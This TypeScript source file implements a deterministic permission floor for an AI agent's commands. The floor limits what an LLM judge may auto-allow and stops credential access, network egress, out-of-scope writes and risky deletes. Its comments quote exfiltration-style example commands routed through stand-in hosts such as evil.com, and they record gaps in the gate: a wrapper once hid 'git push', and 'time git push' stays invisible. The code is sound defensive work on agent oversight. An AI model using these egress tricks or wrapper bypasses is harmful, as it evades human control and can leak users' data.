/**
 * dspa-gate.ts — deterministic hard floor for /dspa auto-allow.
 *
 * The code-enforced floor (docs/dspa-redesign.md, D1): an operation may only
 * reach the judge (and be auto-allowed) if it passes every check here. The
 * LLM never has authority over these. Everything the gate does NOT check is
 * JUDGEABLE — the judge sees the full command text (including inline script
 * bodies) plus halter's analysis digest and decides; a wrong verdict can at
 * most produce a prompt, never an auto-allowed operation the floor forbids.
 *
 * Hard floor (fail closed on any):
 *  - bash: no credential-pattern paths, no network egress — except loopback-only
 *    curl/wget (D14: every URL in the command is 127.0.0.0/8, ::1, or
 *    localhost; a local call can't exfiltrate, the judge reviews the full
 *    text) — no paths outside the
 *    MANUAL bar (cwd + session grants + config-allowed + trusted scripts —
 *    exactly what manual mode auto-allows, getOutsideCwdPaths) — INCLUDING
 *    paths whose location is statically unprovable (unbound variable,
 *    unresolvable cd target): the WRITE bar is absolute — scope grants are
 *    the user's call, never the judge's. A path manual mode auto-allows
 *    (e.g. /tmp via config) is not a scope violation — the judge reviews it
 *    (D11, 2026-08-26 re-alignment). Since 3.40.0 the floor is two-tier
 *    (docs/dspa-intent-floor.md): a location the parse cannot NAME stops as
 *    a typed miss (`misses[]`), which the fall-through's guarded intent pass
 *    may clear; a BAR — an out-of-bar write, credentials, egress, delete
 *    reach, an `[Absolute]` pattern — is never cleared by a verdict.
 *    Every stop that reaches the prompt is advisory (D16): the prompt
 *    renders the judge's verdict as input to the user's
 *    allow/deny/grant decision (D22: stage 2 is skipped when stage 1
 *    approved) — the stop stands, no verdict grants over a bar. First-word checks are
 *    wrapper/env-prefix transparent (`FOO=bar npx evil` is npx evil; `env
 *    $f` is obscured) — the policy's delegation transparency, mirrored.
 *    Unsafe patterns (inline scripts, redirects, pipes, subshells) and risk
 *    reasons are NOT floor checks — judgeable: the packet already carries
 *    the full command text and the analysis digest.
 *    Package-manager RUN forms (npx, `uv run`, `bun <script>`, …) are
 *    judgeable too (D8) — they execute local/cached code the judge can see;
 *    FETCH forms (`npm install`, `uv sync`, `bun add`, …) stay on the floor.
 *    Detection-limited conditions are judgeable (content-classes T2):
 *    an obscured command position (variable indirection — not flagged by
 *    halter's own analysis) and an unparseable command pass to the judge —
 *    the packet carries the full raw text plus both flags (obfuscation /
 *    parse error), so the judge has strictly more information than the
 *    static pass. Policy stops (above) and unresolvable sentinels (D7)
 *    stay absolute.
 *  - rm carve-out (dspa only): halter always flags rm as dangerous, and
 *    danger patterns always prompt even after Always grants. An rm command
 *    may reach the judge only when every rm target has a statically known
 *    location (a computed target never does), is not the working directory
 *    itself, and is either inside the session base or part of a
 *    create-then-delete set (a path this same command writes via
 *    redirect/tee/touch/mkdir in an earlier segment AND rms), or a
 *    non-recursive world-scratch target directly under /tmp (D8). With
 *    -r/-R an explicit target (if it exists) must be a directory or
 *    self-written. Delete SHAPE and SCALE are checked before this carve-out
 *    (D-c, docs/dspa-intent-floor.md §6): an unbounded shape (computed or
 *    root-level target, a target above the working directory, `find -delete`,
 *    `xargs`-fed rm, `truncate` with a glob) and a delete reaching more than
 *    DELETE_SCALE_ABSOLUTE entries outside the temp dirs stop absolutely;
 *    a statically rooted glob inside the bars is judgeable WITH ITS COUNT
 *    (the count rides the packet and the prompt). Non-rm danger reasons still
 *    block the carve-out (rm's neighborhood is bounded by design). The judge
 *    still approves.
 *  - file: no credential-pattern warning. A write the manual mode
 *    auto-allows (session-granted dir/file, config-allowed, project-pi) is
 *    JUDGEABLE (D3, extended by D11) — the location is user-trusted, the
 *    content is judged in full; truly outside-base writes stop (Q1: scope is
 *    the user's call). Reads are never judged.
 *  - tool (plugin-gated calls): the exec gate is fully JUDGEABLE — its
 *    script payload is opaque to static analysis by construction (the
 *    judge IS the model for it; D11 content review, untrimmed packet).
 *    The egress gate is JUDGEABLE too (content-classes T1) — the outgoing
 *    payload IS the effect (C1): no deterministic floor on it, the full
 *    args ride in the packet, the two-stage cascade decides. The
 *    file/consent gates are never auto-allowed: low-risk prompts whose
 *    repetition session grants cover — they stop like every other floor
 *    stop, advisory (D16).
 */
import fs from "node:fs";
import path from "node:path";
import type {PromptData} from "../decide/types";
import type { Store } from "./store";
import { analyzeCommand } from "../analysis/command-analysis";
import { resolveOpaqueRefs } from "../analysis/var-resolution";
import { expandTilde, shortenToken } from "../analysis/path-util";
import { isPathWarnedResolved, resolvePathReal, isInsideCwd, isAllowedReadPath, isAllowedWritePath, isProjectPiPathResolved } from "../analysis/path-analysis";
import { scriptFilePathInSegment } from "../analysis/script-payload";
import { sanitizeJudgePaths } from "../judge/paths";
import type { ResolutionMap } from "../judge/path-resolver";
import { isTrustedScriptPath } from "../config/trusted-scripts";
import { isGlobUnverified, globUnverifiedToken } from "../analysis/credentials";
import { UNKNOWN_CWD_MARKER, cdBaseBounds, baseWriteAccess, OUT_REDIRECT_RE, IN_REDIRECT_RE, BARE_REDIRECT_RE } from "../analysis/cwd-tracking";
import { rootScanTarget } from "../analysis/evaluators/disk-evaluator";
import { OPAQUE_VAR_DIR } from "../analysis/bash-parser";
import { getDelegatedCommand, segmentFetchPackage, segmentFetchOptionsOk } from "../analysis/segment-helpers";
import { operativeTokens, staticRootOf } from "../analysis/delete-scale";
import { tokenizeSegment, splitOnPipe } from "../analysis/tokenizer";
import {
  NETWORK_COMMANDS,
  NETWORK_URL_RE,
  NETWORK_URL_RE_GLOBAL,
  GIT_FETCH_SUBCOMMANDS,
  UPLOAD_BODY_FLAGS,
  UPLOAD_COPY_COMMANDS,
  HTTP_METHOD_FLAGS,
  gitNetworkSubcommand,
  goCargoFetchForm,
  isAllowedCommand,
  skipEnvPrefixes,
} from "../config";

export type DspaGateResult =
  | { ok: true }
  | {
      ok: false;
      reason: string;
      /** D16: a floor stop that reaches the prompt is advisory — the judge
       *  ran both stages and its verdict renders in the fall-through prompt
       *  as input to the user's allow/deny/grant decision. The stop stands:
       *  no verdict grants over a bar. (Since 3.40.0 a MISS stop can be
       *  cleared BEFORE the prompt, but only by `tryIntentOverMiss`'s
       *  guarded pass, which does not read this field.) The field stays so a
       *  future bare stop can opt out; the gate currently sets it on
       *  every stop. */
      advisory?: boolean;
      /** Confirmed (user-accepted) token → dirs resolutions that fell
       *  outside the base — the fall-through prompt offers a grant for
       *  EXACTLY these dirs (deterministic; no LLM call needed). */
      confirmedOutside?: Array<{ token: string; dirs: string[] }>;
      /** D18: re-based bases the command WRITES that lack a write grant —
       *  the fall-through prompt offers a session write grant for EXACTLY
       *  these dirs (deterministic; no LLM call needed). */
      writeOutside?: string[];
      /** 3.40 (docs/dspa-intent-floor.md §3): this stop is MISS-class — every
       *  location it stopped on is unknown or opaque, so the intent pass can
       *  be asked to turn it into a location (`gate/fallthrough.ts`,
       *  tryIntentOverMiss). Absent when any part of the stop is NOT a miss:
       *  a concrete write operand outside the write bar, or any absolute bar
       *  (those return before a miss is typed). Since 3.41.0 a location with
       *  nothing static about it IS carried (`prefix: ""`) — the §4.2
       *  amendment answers it from the path resolver instead of refusing to
       *  ask. */
      misses?: MissFact[];
    };

/**
 * One location the floor could not name (docs/dspa-intent-floor.md §3/§4).
 * D-g's shape rule: LOCATIONS are judged, BARS are absolute — an unknown
 * location goes to the intent pass to BECOME a location, and the judge's
 * reported paths are then checked against these facts (the §4 guards) and
 * against the write bar. The gate builds them; the fall-through consumes them.
 */
export interface MissFact {
  /** What kind of unknown location: an unbound/opaque reference the parse
   *  could not resolve, a concrete path outside the read bar, or the
   *  re-based dir a body (heredoc, `-c`) writes — the D18 proxy. */
  kind: "unresolved" | "outside-path" | "base-write";
  /** The location text as the parse saw it (`/proc/$EP/io`, the concrete
   *  outside path, the base dir). */
  token: string;
  /** The statically knowable leading dirs of `token` (`/proc` for
   *  `/proc/$EP/io`; the path itself for a concrete one). Guard §4.2 anchors
   *  the judge's report here. "" = nothing static to anchor on: the answer
   *  must then come from the path resolver, per token, and land in-bar
   *  (3.41.0 §4.2 amendment). */
  prefix: string;
  /** The operand role the parse gives it. A write effect at a location the
   *  floor cannot name is never handed to intent (§4.1). */
  role: "read" | "write";
  /** Ledger data only (§7) — no guard reads it: a confirmed resolution (an
   *  earlier user grant, this session) already covered this location, i.e.
   *  the operator had vouched for this place before intent was asked. It is
   *  the difference between a fresh unknown and a known place the parser
   *  lost track of, which is what the rows are mined for. */
  confirmedPrior: boolean;
}

/**
 * The manual WRITE bar — the predicate the file branch applies to a write
 * (D3/D11): session-granted write dirs/paths, config-allowed write paths,
 * project-pi. The read bar (makeManualBar) admits read-allowed dirs (~/.pi
 * is read-allowed in config) that carry no write grant; a bash base write
 * must face THIS bar (D18) — "similar to the write/edit tool": the floor
 * stops a write the manual mode would prompt for, and only that.
 */
export function insideManualWriteBar(store: Store, p: string, cwd: string): boolean {
  return (
    store.isInsideAllowedDir(p, "write") ||
    store.hasAllowedWritePath(p) ||
    isAllowedWritePath(p) ||
    isProjectPiPathResolved(p, cwd)
  );
}

/**
 * D19 (docs/dspa-redesign.md): the deterministic WRITE BAR applied to the
 * stage-2 judge's FRESH `writes` report — in the same pass as the
 * auto-allow decision, first run included. Nothing is learned or
 * persisted: every run re-judges the fresh script content (fenced in the
 * packet), so a changed script re-reports and is judged fresh; a stale
 * copy of a previous run's report could only stop a later run on data
 * that may no longer be true.
 * A reported write outside the manual write bar (and outside the session
 * cwd — the working set, as with the D18 bases) fails the check: the
 * caller synthesizes the exact D18 advisory stop (`write outside base`
 * with the failing dirs on `writeOutside`), so the `Allow writes` grant
 * option and the post-grant steady state work unchanged. The bar only
 * narrows auto-allow — a hallucinated path can cause one advisory stop
 * the user dismisses, never a false allow. Reads stay with the judge and
 * the ledger (a read path has no deterministic bar to act on).
 */
export function judgeWriteOutside(
  pd: PromptData,
  store: Store,
  writes: string[] | undefined,
): string[] {
  if (pd.type !== "bash" || !writes?.length) return [];
  const normCwd = path.resolve(expandTilde(pd.cwd));
  const out: string[] = [];
  for (const p of sanitizeJudgePaths(writes, pd.cwd)) {
    if (isInsideCwd(p, normCwd)) continue;
    if (!insideManualWriteBar(store, p, pd.cwd)) out.push(path.dirname(p));
  }
  return [...new Set(out)];
}

/**
 * D19: an executed script FILE outside the session cwd (the working set)
 * never auto-allows on the stateless pass — stage 1 is eval-locked out
 * of path reports, so its writes surface only in the stage-2 report, and
 * the write bar has to check that report in the same pass (see
 * judgeWriteOutside). The caller escalates such operations to the intent
 * pass from the first run. Trusted skill scripts resolve to null (trust
 * covers the script — the packet carries no content for them); direct
 * exec and interpreter forms both count; computed paths don't resolve
 * (the gate's own sentinel logic owns those).
 */
export function hasFileScriptOutsideCwd(pd: PromptData): boolean {
  if (pd.type !== "bash" || !pd.analysis) return false;
  const analysis = pd.analysis;
  const normCwd = path.resolve(expandTilde(pd.cwd));
  for (let i = 0; i < analysis.parsedSegments.length; i++) {
    const seg = analysis.parsedSegments[i]?.text.trim() ?? "";
    if (!seg) continue;
    const sp = scriptFilePathInSegment(seg, analysis.effectiveCwds[i] ?? pd.cwd);
    if (sp && !isInsideCwd(sp, normCwd)) return true;
  }
  return false;
}

/**
 * D8 (docs/dspa-redesign.md): a package-manager RUN form executes
 * local/cached code — the package name and args are visible in the judge's
 * full-text input, so it is judgeable, not a floor stop. FETCH forms
 * (`npm install`, `uv sync`, `bun add`, …) stay on the floor: fetch =
 * arbitrary postinstall execution + registry access. The 2026-08-24 log:
 * the pre-D8 floor stopped 7 of 26 dspa prompts (`npx tsc`, `npx vitest`,
 * `uv run`) while the judge stopped zero.
 *
 * Lifecycle-script shorthands (`npm test` ≡ `npm run test`; the same
 * shorthands exist in yarn/pnpm — all three document `pm <script>` as
 * script execution) run local package.json scripts only, no registry
 * fetch: run forms, not fetches. 2026-08-31: moved off the floor after
 * dev-loop friction (`sed && npx tsc && npm test` flooring on the
 * shorthand); D8's 0/26 judge-stop record was the tiebreaker.
 */
const PKG_RUN_FORMS: Record<string, ReadonlySet<string> | "all" | "except-fetch"> = {
  npx: "all", // inherently run-a-package (fetches on miss — the judge sees the name)
  uvx: "all",
  npm: new Set(["run", "exec", "x", "test", "start", "stop", "restart"]),
  pnpm: new Set(["run", "dlx", "exec", "x", "test", "start", "stop", "restart"]),
  yarn: new Set(["run", "dlx", "x", "test", "start", "stop", "restart"]),
  uv: new Set(["run", "x"]),
  bun: "except-fetch", // `bun <script>` interpreter form: all but fetch verbs
};

/** bun subcommands that fetch from the registry. */
const BUN_FETCH_VERBS = new Set([
  "install", "i", "add", "remove", "rm", "update", "upgrade", "up",
  "publish", "pub", "link",
]);

/** First operative token after the command word (skips flags, `K=V` env prefixes). */
function firstSubcommand(words: string[]): string | null {
  for (let i = 1; i < words.length; i++) {
    const w = words[i];
    if (w.startsWith("-") || /^[A-Za-z_][A-Za-z0-9_]*=/.test(w)) continue;
    return w.toLowerCase();
  }
  return null;
}

/** True when this segment's first word is a judgeable package-manager RUN form (D8). */
function isPkgRunForm(first: string, words: string[]): boolean {
  const forms = PKG_RUN_FORMS[cleanToken(first)];
  if (!forms) return false;
  if (forms === "all") return true;
  const sub = firstSubcommand(words.map(cleanToken));
  if (forms === "except-fetch") return !sub || !BUN_FETCH_VERBS.has(sub);
  return !!sub && forms.has(sub);
}

/**
 * The words a segment executes FROM COMMAND POSITION: inline env-assignment
 * prefixes and prefix/wrapper delegation (`timeout 120 git push`, `env ssh
 * host`, `xargs -a l scp h:/tmp`, `command nc h 1234`) resolved to the
 * delegated command. The egress collectors must key on what actually runs —
 * the same transparency the risk layer and the D10 trust gate already have
 * (segmentFetchPackage resolves delegation first), and the reason the floor
 * must not be weaker than the risk layer standing in front of it: a wrapper
 * in command position hid `git push` from the floor, the gate passed, and the
 * judge auto-allowed egress that must never auto-allow. Residual: a wrapper
 * outside `wrapperCommands` (e.g. `time git push`) is invisible to both
 * layers. Raw words when the segment delegates to nothing.
 */
function operativeWords(words: string[]): string[] {
  const oper = words.slice(skipEnvPrefixes(words));
  const deleg = getDelegatedCommand(oper.join(" "));
  return deleg ? deleg.tail.split(/\s+/) : oper;
}

/** What a network segment uses the wire for (D-a's egress split).
 *  fetch  — inbound only: `git fetch/pull/ls-remote`, curl/wget with no
 *           outbound body, form, upload, cookie or credential flag and no
 *           mutating method. JUDGEABLE — nothing local leaves the machine, and
 *           the file a download lands in is minted as a write operand
 *           (analysis/write-roles.ts), so it faces the write bar (D-g/D-d).
 *  upload — local data goes out: a curl body/form/upload-file/cookie/user, a
 *           mutating method, scp/sftp/ftp/rsync, `git push`. ABSOLUTE — whether
 *           what leaves is a secret is not verifiable from the command text, so
 *           intent cannot stand in for the user's call (D-a, "exfil is not
 *           intent-verifiable").
 *  opaque — a network form the split cannot classify: ssh/nc, the container and
 *           cloud CLIs, package fetches (install = fetch + postinstall code, so
 *           it stays with D-a's untrusted-package stop), `git clone` (lays down
 *           a tree the floor never named), and an unknown command taking a URL.
 *           ABSOLUTE on the same grounds. */
type EgressKind = "fetch" | "upload" | "opaque";

/** Commands whose network surface the checks below enumerate completely (their
 *  subcommand sets are closed: GIT_NETWORK_SUBCOMMANDS, goCargoFetchForm), so a
 *  URL elsewhere in their argv is data — `git log --grep='http://x'`. */
const ENUMERATED_NETWORK_COMMANDS = new Set(["git", "cargo", "go"]);

/** True when a curl/wget segment sends data OUT (config:UPLOAD_BODY_FLAGS, plus
 *  a mutating `-X`/`--request` method). Short flags may carry the value
 *  attached (`-d'x=1'`, `-XPOST`); `--name=value` splits on the `=`. */
function curlUploadForm(args: string[]): boolean {
  for (let i = 0; i < args.length; i++) {
    const t = cleanToken(args[i]);
    if (!t.startsWith("-")) continue;
    const eq = t.indexOf("=");
    const name = eq > 0 ? t.slice(0, eq) : t;
    // A short value flag may carry its value attached: `-d`/`-d'x'`/`-Td`.
    const short = name.length > 2 && !name.startsWith("--") ? name.slice(0, 2) : name;
    if (UPLOAD_BODY_FLAGS.has(name) || UPLOAD_BODY_FLAGS.has(short)) return true;
    if (HTTP_METHOD_FLAGS.has(name) || HTTP_METHOD_FLAGS.has(short)) {
      // The value is `--request=POST`, `-X POST` or `-XPOST`.
      const attached = eq > 0 ? t.slice(eq + 1) : t.slice(short.length);
      const method = cleanToken(attached || args[i + 1] || "").toUpperCase();
      if (method && method !== "GET" && method !== "HEAD") return true;
    }
  }
  return false;
}

/** The egress class of one segment, or null when the segment does not talk to a
 *  remote. Words come from the quote-aware tokenizer: a whitespace split made
 *  `-H 'content-type: application/json'` name the bare target `application/json`
 *  (3 of the 10 egress stops in the 2026-10-18 ledger replay). */
function segmentEgress(seg: string): { token: string; kind: EgressKind } | null {
  const oper = operativeWords(tokenizeSegment(seg));
  // cleanToken: `"ssh" host` is ssh to the shell (git subcommand resolution is
  // quote-aware in gitNetworkSubcommand).
  const first = cleanToken(oper[0] ?? "").toLowerCase();
  if (!first) return null;
  if (isPkgRunForm(first, oper)) return null; // D8 run forms — judged on their own rules
  const sub = gitNetworkSubcommand(oper);
  if (sub) {
    const kind: EgressKind = GIT_FETCH_SUBCOMMANDS.has(sub) ? "fetch" : sub === "push" ? "upload" : "opaque";
    return { token: `git ${sub}`, kind };
  }
  const gc = goCargoFetchForm(oper);
  if (gc) return { token: gc, kind: "opaque" };
  if (!NETWORK_COMMANDS.has(first)) return null;
  if (first === "curl" || first === "wget") {
    return { token: first, kind: curlUploadForm(oper.slice(1)) ? "upload" : "fetch" };
  }
  if (UPLOAD_COPY_COMMANDS.has(first)) return { token: first, kind: "upload" };
  return { token: first, kind: "opaque" };
}

/** A segment whose command the egress machinery cannot enumerate: not one of the
 *  read-only ALLOW_TABLE commands, not a network command, not a command whose
 *  remote surface is a closed subcommand set. Unknown is never benign — the URL
 *  in its argv is a destination (`mytool http://evil/x`, `bash -c 'curl …'`). */
function segmentHasUnknownCommand(seg: string): boolean {
  for (const stage of splitOnPipe(seg)) {
    const oper = operativeWords(tokenizeSegment(stage));
    const first = cleanToken(oper[0] ?? "").toLowerCase();
    if (!first) continue;
    if (isAllowedCommand(first) || NETWORK_COMMANDS.has(first)) continue;
    if (ENUMERATED_NETWORK_COMMANDS.has(first)) continue;
    return true;
  }
  return false;
}

/** First egress hit that the floor must stop on, or (when every hit is
 *  inbound) the fetch hit itself; URLs truncated to 60 chars. Package-manager
 *  RUN forms are skipped (D8 — judgeable). The operative first word
 *  (env-prefixes skipped, wrapper/prefix delegation resolved) is checked, and
 *  git's subcommand is resolved past global flags via the shared
 *  gitNetworkSubcommand — `git -C dir push` is egress exactly like `git push`. */
function networkHit(command: string, segments: string[]): { token: string; kind: EgressKind } | null {
  let inbound: { token: string; kind: EgressKind } | null = null;
  for (const seg of segments) {
    const hit = segmentEgress(seg);
    if (!hit) continue;
    if (hit.kind !== "fetch") return hit; // the stop-worthy half names the reason
    inbound ??= hit;
  }
  // D-i: the fetch half's premise is "nothing local leaves the machine", which
  // needs a destination the parse can READ. `curl -x evil.com:8080
  // http://127.0.0.1/y` sends the request through a route the text does not
  // name; `socks5://`/`ftp://` forms and a target stated only as a variable
  // (`curl "$B/notes"`) or not at all (`curl -O pkg.tgz`) are the same hole.
  // destinationHosts already returns null/empty for all of those, so an
  // unclassifiable curl/wget destination falls to the opaque half.
  if (inbound && (inbound.token === "curl" || inbound.token === "wget")) {
    const hosts = destinationHosts(command, segments);
    if (!hosts || hosts.length === 0) return { token: inbound.token, kind: "opaque" };
  }
  // The URL catch-all covers commands OUTSIDE that vocabulary — and only those.
  // Inside it a URL literal is data, which is what the whole-command scan used to
  // cost: `grep -rn 'http://example.com' docs/`, `sed -i 's|http://a|http://b|'`,
  // a heredoc writing docs that quote a curl example (the 2026-10-18 replay
  // counted 4 such stops in 520 rows). A fetch segment plus a URL in a doc body
  // stays fetch — the classification above already saw the segment.
  if (segments.some(segmentHasUnknownCommand)) {
    const urls = command.match(NETWORK_URL_RE_GLOBAL) ?? [];
    if (urls.length > 0) {
      // Name a URL the floor actually stops on, not the first one in the text.
      const offending = urls.find((u) => !isLoopbackHost(urlHost(u))) ?? urls[0]!;
      return { token: offending.slice(0, 60), kind: "opaque" };
    }
  }
  return inbound;
}

/** Egress commands whose destination is a URL visible in the command text. */
const LOOPBACK_EGRESS_CMDS = new Set(["curl", "wget"]);

/** Host part of an http(s) URL match (scheme stripped, port/brackets kept). */
function urlHost(url: string): string {
  return url.replace(/^https?:\/\//, "").split("/")[0];
}

/** Strict 127.0.0.0/8 quad (each octet ≤ 255). */
const LOOPBACK_V4_RE = /^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;

/**
 * Loopback hosts: a STRICT 127.0.0.0/8 quad, ::1 (bare or [bracketed]), or
 * localhost (exact). The old `startsWith("127.")` accepted hostnames that
 * merely LOOK like loopback — `127.0.0.1.attacker.com` is a DNS name that
 * can resolve anywhere, and `127.0.0.1@evil.com` carries evil.com as its
 * real host behind a userinfo prefix. Both now fail the check (floor stop).
 */
function isLoopbackHost(hostWithPort: string): boolean {
  let h = hostWithPort;
  if (h.startsWith("[")) {
    const close = h.indexOf("]");
    if (close < 0) return false;
    return h.slice(1, close) === "::1";
  }
  const at = h.lastIndexOf("@");
  if (at !== -1) h = h.slice(at + 1); // userinfo — the host is what follows
  const noPort = h.split(":")[0];
  if (noPort === "localhost" || noPort === "::1") return true;
  if (!LOOPBACK_V4_RE.test(noPort)) return false;
  return noPort.split(".").slice(1).every((o) => Number(o) <= 255);
}

/**
 * D14 (docs/dspa-redesign.md): the command's egress is provably loopback
 * when every operative first word is curl/wget (no git egress subcommand,
 * no ssh/scp/nc, no package form, no deploy CLI) and the command contains
 * at least one URL, ALL of them loopback-hosted (127.0.0.0/8, ::1,
 * localhost). A local call can't exfiltrate off the machine, so it is
 * JUDGEABLE — the judge sees the full text and decides.
 *
 * Fail-closed: a variable host (`curl http://$HOST/x` → host "$HOST"), a
 * URL-less target (`curl "$B"` — no URL proves locality), or any other
 * egress form all return false and keep the floor stop. Any non-loopback
 * destination reachable from this command text is a URL in the text (or an
 * assignment into one), so "every URL is loopback" closes it; a host taken
 * from the parent environment without appearing as a URL can't be built
 * from this command alone (scheme://$VAR still surfaces as a URL here).
 */
function isLoopbackEgress(command: string, segments: string[]): boolean {
  for (const seg of segments) {
    const oper = operativeWords(tokenizeSegment(seg));
    // cleanToken: a quoted curl is still curl (`"curl" http://127…` must
    // not fall out of the egress classification entirely).
    const first = cleanToken(oper[0] ?? "").toLowerCase();
    if (!first) continue;
    if (isPkgRunForm(first, oper)) continue; // D8 run forms — judged on their own rules
    if (gitNetworkSubcommand(oper)) return false; // remote destination, never loopback-provable
    if (NETWORK_COMMANDS.has(first) && !LOOPBACK_EGRESS_CMDS.has(first)) return false;
  }
  const hosts = destinationHosts(command, segments);
  if (!hosts || hosts.length === 0) return false; // unprovable destination — keep the stop
  return hosts.every((h) => isLoopbackHost(h));
}

/**
 * A curl/wget operand that states its destination with no scheme:
 * `127.0.0.1:9931/models`, `[::1]:9931/models`, `localhost:8080/health`. The
 * port or the path is what separates a target from a file operand: `curl -O
 * pkg.tgz` names no host, and a bare `curl 127.0.0.1` (no port, no path)
 * stays unprovable.
 */
const BARE_TARGET_RE = /^(\[[0-9A-Fa-f:.]+\]|[A-Za-z0-9][A-Za-z0-9._-]*)(?::\d+)?[/?#]/;

/**
 * An operand that states a destination BARE_TARGET_RE cannot read. Dropping
 * one is fail-OPEN, not fail-closed: the loopback hosts that survive still
 * satisfy `every()`, so `curl -x evil.com:8080 http://127.0.0.1/y` looked
 * local. Caught here: userinfo (`127.0.0.1@evil.com/x` — curl sends that to
 * evil.com), a bare `host:digits` (`-x evil.com:8080`, a proxy — real egress
 * even with a loopback URL in the command), and any other `scheme://` form
 * (`socks5://evil.com:1080`, `ftp://evil.com/f` — the URL scan only knows
 * http(s), so those hosts were invisible). `Accept:` (a header value) and
 * `user:pass` (a credential) stay out: a port is digits, and a trailing
 * colon proves nothing.
 */
const HOSTISH_RE = /^(?:[A-Za-z0-9._-]+@|[A-Za-z0-9._-]+:\d|\[[0-9A-Fa-f:.]+\])/;

/** A `scheme://` operand the http(s) URL scan does not cover. */
const OPAQUE_SCHEME_RE = /:\/\/|^\/{2}/;

/**
 * Every destination the egress classification can read off the text: URLs
 * anywhere in the command, plus the scheme-less `host[:port]/path` operands
 * of curl/wget. D14's locality proof is the HOST — the scheme carries nothing
 * the host parse does not already have, so `curl 127.0.0.1:9931/models` is as
 * judgeable as the qualified form (it used to surface no URL at all and fall
 * through to the egress stop). `null` = the text states a destination this
 * parse cannot resolve, which is not the same as stating no destination.
 */
function destinationHosts(command: string, segments: string[]): string[] | null {
  const hosts: string[] = [];
  for (const u of command.match(NETWORK_URL_RE_GLOBAL) ?? []) {
    const h = urlHost(u);
    // `http://$HOST/x` is a stated destination this parse cannot resolve —
    // as unresolvable as the proxy forms below, not a host that merely fails
    // the loopback test. (A `$` in the PORT survives: `http://127.0.0.1:$p/…`
    // is as local as the literal form, since locality is a host question.)
    if (/[$`]/.test(h.split("@").pop()!.split(":")[0])) return null;
    hosts.push(h);
  }
  for (const seg of segments) {
    const oper = operativeWords(tokenizeSegment(seg));
    const first = cleanToken(oper[0] ?? "").toLowerCase();
    if (!first || !LOOPBACK_EGRESS_CMDS.has(first)) continue;
    for (const w of oper.slice(1)) {
      const t = cleanToken(w);
      if (!t || t.startsWith("-")) continue; // flags stay out; their values are not hosts
      const bare = t.match(BARE_TARGET_RE);
      if (bare) {
        hosts.push(bare[1]);
        continue;
      }
      if (!/^https?:\/\//i.test(t) && (HOSTISH_RE.test(t) || OPAQUE_SCHEME_RE.test(t))) {
        return null;
      }
    }
  }
  return hosts;
}

/**
 * D7 (docs/dspa-redesign.md): outside paths the parser could not bind to a
 * location — `<unresolved-cwd>` (a cd inside a `||` chain leaves the side's
 * directory ambiguous) or `<unresolved-var>` (opaque variable). The
 * opaque-variable dataflow lives in the analysis layer (analysis/
 * var-resolution: scoped local assignments + the tracked effective base +
 * cwd-local loop/pipeline modeling) — a sentinel that reaches the gate is
 * unbound by construction.
 *
 * Q1 is absolute (scope grants are the user's call, NEVER the judge's), so
 * an unprovable location is a FLOOR STOP, not a judgeable fall-through:
 *  - unbound variable → stop, naming the token (the prompt already lists it);
 *  - unbounded cwd marker (any unresolvable cd in the command — `cd $X`,
 *    glob, `cd -`) → stop; the side's base could be ANYWHERE;
 *  - bounded cwd marker (every cd literal, per cdBaseBounds) → the side runs
 *    under one of the candidate bases (session cwd + each literal cd target);
 *    EVERY candidate is checked against the base — all inside → drop, any
 *    outside → stop naming the CONCRETE dir (one Always-for-dir makes later
 *    runs pass, D3-style).
 *
 * The 2026-08-24 "single resolvable cd target bounds the side" reading is
 * REVISED (2026-08-25 review): it resolved relative targets against the
 * PROCESS cwd (wrong root) and claimed boundedness even when an earlier
 * unresolvable cd made the base unbounded — both let outside-base reads
 * pass the floor.
 */
/**
 * The manual bar (Q1 floor): a path is inside it when manual mode would
 * not prompt for it — under the cwd, in a session-granted dir, config-
 * allowed, or a trusted script. Shared by the gate (scope checks) and the
 * prompt flow (deciding which one-shot-"Yes" resolutions are safe to
 * confirm — all-in-bar dirs never needed a grant, so confirming them only
 * makes the next run deterministic).
 */
export function makeManualBar(store: Store, cwd: string): (p: string) => boolean {
  return (p: string) =>
    isInsideCwd(p, cwd) ||
    store.isInsideAllowedDir(p, "read") ||
    isAllowedReadPath(p) ||
    isAllowedWritePath(p) ||
    isTrustedScriptPath(p);
}

type D7Resolution =
  | { kind: "inside" } // every candidate base keeps it in-base
  | { kind: "outside"; paths: string[]; confirmedToken?: string } // concrete outside-base locations
  | { kind: "stop"; reason: string }; // unprovable location — Q1 floor stop

/**
 * Resolve one sentinel outside path (see D7 above).
 *
 * `confirmed` is the user-accepted resolution for an opaque-var token
 * (store.getConfirmedResolution — set when the user took an option that
 * granted the LLM-suggested dirs for it). A confirmed sentinel is judged
 * like a concrete location: every confirmed dir inside the base → in-base
 * (judgeable); any dir outside → an outside stop naming exactly those dirs
 * (the prompt offers a grant for them, so the next identical run passes —
 * steady state without an LLM). Unconfirmed → the Q1 floor stop.
 */
function d7ResolveSentinel(
  p: string,
  cwd: string,
  isInsideBase: (p: string) => boolean,
  bounds: { unbounded: boolean; candidates: string[] },
  opaque: { token: string | null; confirmed: string[] | null },
): D7Resolution {
  if (p.startsWith(OPAQUE_VAR_DIR)) {
    const token =
      opaque.token ?? p.slice(OPAQUE_VAR_DIR.length + 1).replace(/^\//, "");
    if (opaque.confirmed) {
      const outside = opaque.confirmed.filter((d) => !isInsideBase(d));
      return outside.length > 0
        ? { kind: "outside", paths: outside, confirmedToken: token }
        : { kind: "inside" };
    }
    return { kind: "stop", reason: `runtime location unresolvable (${shortenToken(token)})` };
  }
  if (p.startsWith(UNKNOWN_CWD_MARKER)) {
    if (bounds.unbounded) {
      return { kind: "stop", reason: "runtime working directory unresolvable (cd target not statically knowable)" };
    }
    // Bounded: the side's base is one of the candidates; a `..` tail can
    // escape from ANY of them, so every candidate must be checked against
    // the base (not just the last cd target).
    const rest = p.slice(UNKNOWN_CWD_MARKER.length).replace(/^\//, "");
    const locations = bounds.candidates.map((c) => path.resolve(c, rest));
    const outside = locations.filter((l) => !isInsideBase(l));
    return outside.length > 0 ? { kind: "outside", paths: outside } : { kind: "inside" };
  }
  return { kind: "stop", reason: "runtime location unresolvable" };
}

/**
 * D-g (docs/dspa-intent-floor.md): the ABSOLUTE bars the pattern tables name.
 * `config/dangerous-patterns.ts` flags the entries whose bar is absolute, and
 * the analysis marks those hits `[Absolute] <label>` (every other entry is a
 * CLASS label the judge rules on — D1). Matching on the reason the analysis
 * already emitted, rather than re-matching the table in the gate, is what keeps
 * the analysis's own exclusions: trusted commands, version-only invocations and
 * quoted text (`grep "curl | bash" notes.md`) never reach the bar.
 */
